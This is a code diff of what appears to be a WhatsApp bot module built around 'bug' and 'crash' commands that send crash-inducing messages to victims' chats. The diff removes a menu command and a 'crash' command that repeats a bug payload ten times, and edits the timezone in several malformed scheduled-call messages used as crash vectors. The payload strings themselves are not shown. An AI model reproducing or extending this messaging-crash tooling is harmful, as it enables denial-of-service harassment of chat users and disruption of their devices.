@@ -115,77 +115,6 @@ async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
 // --cmds--
 
 // bug menu
-ezra(
-    {
-        nomCom: "bu",
-        categorie: category,
-        reaction: reaction
-    },
-
-    async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre } = commandOptions;
-        const mono = "```";
-        const time = moment().tz(conf.TZ).format("HH:mm:ss");
-        const versions = ["v1", "v2"];
-        const version = versions[Math.floor(Math.random() * versions.length)];
-        const menuImage = fs.readFileSync(
-            path.resolve(
-                path.join(__dirname, "..", "media", "deleted-message.jpg")
-            )
-        );
-        const tumbUrl =
-            "https://qu.ax/NfJZk.jpg";
-        let menu = `${mono}Hello✌️ ${ms.pushName}
-${timewisher(time)}
-
-
-
-┗❏${mono}`;
-        switch (version) {
-            case "v1":
-                {
-                    zk.sendMessage(
-                        dest,
-                        {
-                            image: menuImage,
-                            caption: menu
-                        },
-                        { quoted: ms }
-                    );
-                }
-                break;
-            case "v2":
-                {
-                    zk.sendMessage(
-                        dest,
-                        {
-                            image: menuImage,
-                            caption: menu,
-                            contextInfo: {
-                                mentionedJid: [ms.key.remoteJid],
-                                forwardingScore: 9999999,
-                                isForwarded: true,
-                                externalAdReply: {
-                                    showAdAttribution: true,
-                                    title: `${conf.BOT}`,
-                                    body: `Bot Created By ${conf.OWNER_NAME}`,
-                                    thumbnail: { url: tumbUrl },
-                                    thumbnailUrl: tumbUrl,
-                                    previewType: "PHOTO",
-                                    sourceUrl:
-                                        "https://whatsapp.com/channel/0029Vaw6yRaBPzjZPtVtA80A",
-                                    mediaType: 1,
-                                    renderLargerAbhinail: true
-                                }
-                            }
-                        },
-                        { quoted: ms }
-                    );
-                }
-                break;
-        }
-    }
-);
 
 //bug
 ezra(
@@ -225,31 +154,6 @@ ezra(
             });
         }
         await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
-    }
-);
-
-//crash
-ezra(
-    {
-        nomCom: "crash",
-        categorie: category,
-        reaction: reaction
-    },
-
-    async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre, superUser } = commandOptions;
-        const bug = bugtext6;
-        if (!superUser) return await repondre(mess.prem);
-        await loading(dest, zk);
-        try {
-            for (let i = 0; i < 10; i++) {
-                await repondre(bug);
-            }
-        } catch (e) {
-            await repondre(`an error occoured sending bugs`);
-            console.log(`an error occured sending bugs : ${e}`);
-            return;
-        }
     }
 );
 
@@ -406,7 +310,7 @@ ezra(
                     scheduledCallCreationMessage: {
                         callType: "2",
                         scheduledTimestampMs: `${moment(1000)
-                            .tz("Asia/Islamabad")
+                            .tz("Asia/Karachi")
                             .format("DD/MM/YYYY HH:mm:ss")}`,
                         title: bug
                     }
@@ -458,7 +362,7 @@ ezra(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Islamabad")
+                    .tz("Asia/Karachi")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: `${bugtext1}`
             }
@@ -542,7 +446,7 @@ ezra(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Islamabad")
+                    .tz("Asia/Karachi")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: bugtext2
             }
@@ -626,7 +530,7 @@ ezra(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Islamabad")
+                    .tz("Asia/Karachi")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: `${bugtext1}`
             }
@@ -710,7 +614,7 @@ ezra(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Islamabad")
+                    .tz("Asia/Karachi")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: bugtext3
             }
@@ -794,7 +698,7 @@ ezra(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Islamabad")
+                    .tz("Asia/Karachi")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: bugtext4
             }
@@ -878,7 +782,7 @@ ezra(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Islamabad")
+                    .tz("Asia/Karachi")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: bugtext2
             }
